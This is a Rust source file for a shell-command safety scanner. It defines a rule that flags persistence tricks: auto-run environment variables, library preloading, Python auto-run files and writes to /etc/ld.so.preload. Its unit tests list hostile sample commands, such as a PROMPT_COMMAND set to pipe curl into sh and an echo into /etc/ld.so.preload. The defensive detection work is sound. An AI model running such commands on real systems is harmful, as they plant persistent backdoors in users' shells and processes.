//! Red: hijacks a language or shell's automatic-execution hooks via an environment variable or
//! startup file, so attacker code runs on every future shell, editor, or interpreter launch.

use crate::analysis::Flag;
use crate::config::NoConfig;
use crate::model::{Detail, Verdict};
use crate::parser::{Assignment, Command};
use crate::register_flag;

/// Env vars whose value is executed / sourced automatically by a shell or interpreter.
/// `(name, human description)`.
const EXEC_VARS: &[(&str, &str)] = &[
    ("BASH_ENV", "sourced by every non-interactive bash"),
    ("ENV", "sourced by every non-interactive sh"),
    ("PROMPT_COMMAND", "run before every bash prompt"),
    ("PS0", "evaluated before every command"),
    ("PYTHONSTARTUP", "run at every interactive Python start"),
    ("GIT_SSH_COMMAND", "run for every git network operation"),
    ("GIT_SSH", "run for every git network operation"),
    ("LESSOPEN", "run by less for every file it opens"),
    ("PERL5OPT", "applied to every perl invocation"),
    ("RUBYOPT", "applied to every ruby invocation"),
];
/// Preload vars: force a library into every dynamically linked process.
const PRELOAD_VARS: &[&str] = &[
    "LD_PRELOAD",
    "LD_AUDIT",
    "LD_LIBRARY_PATH",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
];

fn base(name: &str) -> &str {
    crate::config::base_name(name)
}

/// Files under site-packages / python that run on every interpreter start.
fn is_python_autorun(path: &str) -> bool {
    let p = path.trim_matches(['"', '\'']);
    p.ends_with("sitecustomize.py")
        || p.ends_with("usercustomize.py")
        || std::path::Path::new(p)
            .extension()
            .is_some_and(|ext| ext.eq_ignore_ascii_case("pth"))
}

pub struct EnvHijack;

impl Flag for EnvHijack {
    fn visit_assignment(&mut self, a: &Assignment) -> Verdict {
        if let Some((_, desc)) = EXEC_VARS.iter().find(|(n, _)| *n == a.name) {
            return red(
                format!("sets `{}`, which is {desc}", a.name),
                "Every future shell or interpreter runs this value as code.",
                a.span.clone(),
            );
        }
        if a.name == "NODE_OPTIONS"
            && (a.value.text.contains("--require") || a.value.text.contains("--import"))
        {
            return red(
                "sets `NODE_OPTIONS` to preload a module into every Node process".into(),
                "`--require`/`--import` injects code into every `node` invocation, including other tools' internals.",
                a.span.clone(),
            );
        }
        if PRELOAD_VARS.contains(&a.name.as_str()) && !a.value.text.is_empty() {
            return red(
                format!("sets `{}` to force-load a library", a.name),
                "A preloaded library runs inside every dynamically linked program you start.",
                a.span.clone(),
            );
        }
        Verdict::Ignore
    }

    fn visit_command(&mut self, c: &Command) -> Verdict {
        // Writing a Python auto-run file, or /etc/ld.so.preload (system-wide, dead).
        let sinks = c.redirects.iter().chain(c.args.iter());
        for w in sinks {
            let p = w.text.trim_matches(['"', '\'']);
            if p == "/etc/ld.so.preload" && matches!(base(&c.name), "tee" | "cp" | "mv" | "install")
            {
                return Verdict::Dead(
                    Detail::new(
                        "writes `/etc/ld.so.preload`, backdooring every process on the system",
                        "A system-wide preload injects a library into every program every user runs; it is a rootkit primitive.",
                    )
                    .fix("Do not run this.")
                    .at(c.span.clone()),
                );
            }
            if is_python_autorun(p) && matches!(base(&c.name), "tee" | "cp" | "mv" | "install") {
                return red(
                    format!("writes a Python auto-run file `{p}`"),
                    "`sitecustomize.py`/`.pth` files execute on every Python start.",
                    c.span.clone(),
                );
            }
        }
        // Redirect writes to /etc/ld.so.preload (`echo x > /etc/ld.so.preload`).
        if c.redirects
            .iter()
            .any(|w| w.text.trim_matches(['"', '\'']) == "/etc/ld.so.preload")
        {
            return Verdict::Dead(
                Detail::new(
                    "writes `/etc/ld.so.preload`, backdooring every process on the system",
                    "A system-wide preload injects a library into every program every user runs; it is a rootkit primitive.",
                )
                .fix("Do not run this.")
                .at(c.span.clone()),
            );
        }
        Verdict::Ignore
    }
}

fn red(title: String, why: &str, span: crate::model::Span) -> Verdict {
    Verdict::Red(Detail::new(title, why)
        .fix("Legitimate tools ask you to add a line yourself; they do not silently set execution hooks.")
        .at(span))
}

register_flag! {
    id: "env_hijack",
    kind: Red,
    category: Sensitive,
    description: "Hijacks auto-run hooks: BASH_ENV/PROMPT_COMMAND/LD_PRELOAD/NODE_OPTIONS --require, sitecustomize, /etc/ld.so.preload",
    config: NoConfig,
    build: |_cfg, _shared| EnvHijack,
}

#[cfg(test)]
mod tests {
    #[allow(unused_imports)]
    use super::super::testing::*;
    use crate::model::FlagKind;

    #[test]
    fn flags_execution_hooks() {
        assert!(fires("env_hijack", "export BASH_ENV=/tmp/x.sh"));
        assert!(fires("env_hijack", "export PROMPT_COMMAND='curl x|sh'"));
        assert!(fires("env_hijack", "export LD_PRELOAD=/tmp/eve.so"));
        assert!(fires(
            "env_hijack",
            "export NODE_OPTIONS='--require /tmp/x.js'"
        ));
        assert!(fires(
            "env_hijack",
            "cp evil.py ~/.local/lib/python3.11/site-packages/sitecustomize.py"
        ));
        assert_eq!(
            kind("env_hijack", "echo /tmp/e.so > /etc/ld.so.preload"),
            Some(FlagKind::Dead)
        );
        assert_eq!(
            kind("env_hijack", "tee /etc/ld.so.preload"),
            Some(FlagKind::Dead)
        );
    }

    #[test]
    fn ignores_benign_env() {
        assert!(!fires(
            "env_hijack",
            "export NODE_OPTIONS=--max-old-space-size=4096"
        ));
        assert!(!fires("env_hijack", "export EDITOR=vim"));
        assert!(!fires(
            "env_hijack",
            "export PATH=\"$HOME/.local/bin:$PATH\""
        ));
        assert!(
            !fires("env_hijack", "export LD_LIBRARY_PATH="),
            "empty value is a reset"
        );
    }
}
